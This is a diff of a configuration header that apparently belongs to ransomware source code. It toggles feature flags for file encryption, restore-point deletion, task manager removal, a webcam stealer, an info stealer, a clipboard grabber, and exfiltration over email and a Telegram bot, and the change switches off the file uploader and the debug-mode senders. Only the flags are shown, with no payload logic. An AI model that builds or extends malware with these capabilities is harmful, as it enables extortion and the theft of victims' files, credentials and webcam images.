@@ -48,7 +48,7 @@
 #define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
-#define FILE_UPLOADER		true	// enable or disable file uploader
+#define FILE_UPLOADER		false	// enable or disable file uploader
 #define TAKE_WEBCAMS		true	// enable or disable webcam stealer
 #define STEAL_INFO			true	// enable or disable info stealer
 #define GET_CLIPBOARD		true	// enable or disable clipboard grabber
@@ -61,9 +61,9 @@
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
 #define BACKUP_INFOFILE		true	// enable or disable backup maker in current folder for infoFile in debug mode
 #define SEND_EMAIL			true	// enable or disable email sender
-#define DEBUG_SEND_EMAIL	true	// enable or disable email sender in debug mode
+#define DEBUG_SEND_EMAIL	false	// enable or disable email sender in debug mode
 #define SEND_TGBOT			true	// enable or disable telegram bot sender
-#define DEBUG_SEND_TGBOT	true	// enable or disable telegram bot sender in debug mode
+#define DEBUG_SEND_TGBOT	false	// enable or disable telegram bot sender in debug mode
 #define SEND_CUSTOM_COMMAND false	// enable or disable custom command runner after encrytpion
 #define SELFKILL			false	// enable or disable self killer at the end of the program
 #define MAX_RETRIES			false	// enable or disable a maximum number of retries for decryptor
